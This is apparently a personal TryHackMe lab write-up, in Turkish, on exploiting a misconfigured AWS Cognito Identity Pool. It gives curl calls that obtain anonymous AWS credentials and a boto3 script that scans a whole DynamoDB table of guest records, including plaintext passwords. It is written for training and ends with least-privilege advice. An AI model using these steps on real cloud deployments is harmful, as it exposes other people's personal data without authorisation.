---
title: "Complimentary — TryHackMe AWS Cognito Misconfiguration"
date: 2026-09-12 21:00:00 +0300
categories: [TryHackMe]
tags: [aws, cognito, dynamodb, cloud, misconfiguration, tryhackme]
---

> TryHackMe · Hacker Holidays 2026 · Easy · Cloud/AWS
{: .prompt-info }

Giriş ekranı olmayan bir "wellness" uygulamasının, arka planda herkese aynı **AWS Cognito Identity Pool**'undan anonim (unauthenticated) geçici kimlik bilgisi dağıtmasıyla başlayan; bu kimlik bilgilerinin sadece kendi kaydını değil, tüm DynamoDB tablosunu okumaya izin verecek kadar gevşek bir IAM rolüne bağlı olmasından kaynaklanan bir bulut yanlış yapılandırması.

| Hedef | Kategori |
|---|---|
| complimentary-wellness-app (S3 static site) | Cloud / AWS Cognito |

**Zincir:** Statik site kaynak kodu → `app.js` içinde Cognito Identity Pool ID + DynamoDB tablo adı → `GetId` / `GetCredentialsForIdentity` (anonim) → geçici AWS credential → `Scan` (tüm tablo, sadece `GetItem` değil) → başka bir misafirin kaydında flag

## 01 — Keşif: neden login ekranı yok

Uygulama hiç hesap oluşturma/login istemiyordu, sayfa her açıldığında ziyaretçiyi zaten "tanıyor" gibi davranıyordu. `app.js` dosyası, bu "sihrin" kaynağını doğrudan açık ediyordu:

```js
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

Uygulama her ziyaretçiye, bu Cognito Identity Pool'undan **unauthenticated (anonim) identity** akışıyla geçici AWS credential'ı alıyor ve `dynamodb.getItem()` ile yalnızca kendi tarayıcı `localStorage`'ında ürettiği `guest_id`'ye ait kaydı çekiyordu.

## 02 — Anonim AWS credential elde etme

Cognito Identity servisinin `GetId` ve `GetCredentialsForIdentity` aksiyonları, unauthenticated bir pool için imza (SigV4) gerektirmeden, doğrudan JSON istekleriyle çağrılabiliyor:

```console
$ curl -s -X POST https://cognito-identity.us-east-1.amazonaws.com/ \
  -H 'Content-Type: application/x-amz-json-1.1' \
  -H 'X-Amz-Target: AWSCognitoIdentityService.GetId' \
  -d '{"IdentityPoolId":"us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"}'
{"IdentityId":"us-east-1:4d571309-b0eb-ceb7-6d48-83de44561500"}
```

```console
$ curl -s -X POST https://cognito-identity.us-east-1.amazonaws.com/ \
  -H 'Content-Type: application/x-amz-json-1.1' \
  -H 'X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity' \
  -d '{"IdentityId":"us-east-1:4d571309-b0eb-ceb7-6d48-83de44561500"}'
{"Credentials":{"AccessKeyId":"ASIA...","SecretKey":"...","SessionToken":"..."}, ...}
```

Bu üç değer (`AccessKeyId`, `SecretKey`, `SessionToken`), uygulamanın her ziyaretçiye verdiği ile birebir aynı geçici AWS kimlik bilgileridir — hiçbir kayıt/login olmadan.

## 03 — Yatay veri sızıntısı: GetItem yerine Scan

Ön yüz kodu sadece `getItem` çağırıyordu, ama bu credential'ların bağlı olduğu IAM rolü DynamoDB üzerinde daha geniş izinlere (`dynamodb:Scan`) sahipti. `boto3` ile alınan credential'lar kullanılarak tüm tablo tek seferde çekildi:

```python
import boto3

client = boto3.client(
    "dynamodb",
    region_name="us-east-1",
    aws_access_key_id=creds["AccessKeyId"],
    aws_secret_access_key=creds["SecretKey"],
    aws_session_token=creds["SessionToken"],
)

resp = client.scan(TableName="complimentary-GuestWellnessProfiles")
for item in resp["Items"]:
    print(item)
```

Sonuç, uygulamanın gerçek misafirlerine ait tüm profilleri (isim, e-posta, telefon, konum, **düz metin parola**) döktü — aralarında ayrıca bir "VIP-042" kaydı da vardı:

```text
{'password': {'S': 'escalation_only'}, 'guest_id': {'S': 'guest-vip-042'},
 'notes': {'S': "If you're reading this, the wellness app's guest role can
 read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"}, ...}
```

> ✅ flag, o kaydın `notes` alanında açıkça duruyordu
{: .prompt-tip }

## Özet — Öğrenilen teknikler

- Cognito Identity Pool'larında **unauthenticated identity** akışı, tarayıcıdaki JS kodunda görünen bir `IdentityPoolId` üzerinden hiçbir kimlik doğrulaması yapılmadan çağrılabilir — pool ID'yi bilmek, o pool'un verdiği her credential'ı almak için yeterlidir.
- Ön yüz kodunun sadece `getItem` çağırması bir güvenlik sınırı değildir; asıl sınır credential'ın bağlı olduğu **IAM policy**'dir. İstemci koduna güvenmek yerine, backend/IAM tarafında en az ayrıcalık (yalnızca kendi `guest_id`'sine `Condition` ile kısıtlanmış `dynamodb:GetItem`) uygulanmalıdır.
- "Login gerektirmeyen, sürtünmesiz" tasarımların çoğu zaman arka planda hâlâ bir kimlik doğrulama/yetkilendirme sistemi (burada Cognito) kullandığı ve bunun istemci tarafı JS kodunda incelenebilir olduğu.

---

Kişisel TryHackMe lab notu — Complimentary (Hacker Holidays 2026), eğitim/lab ortamı.
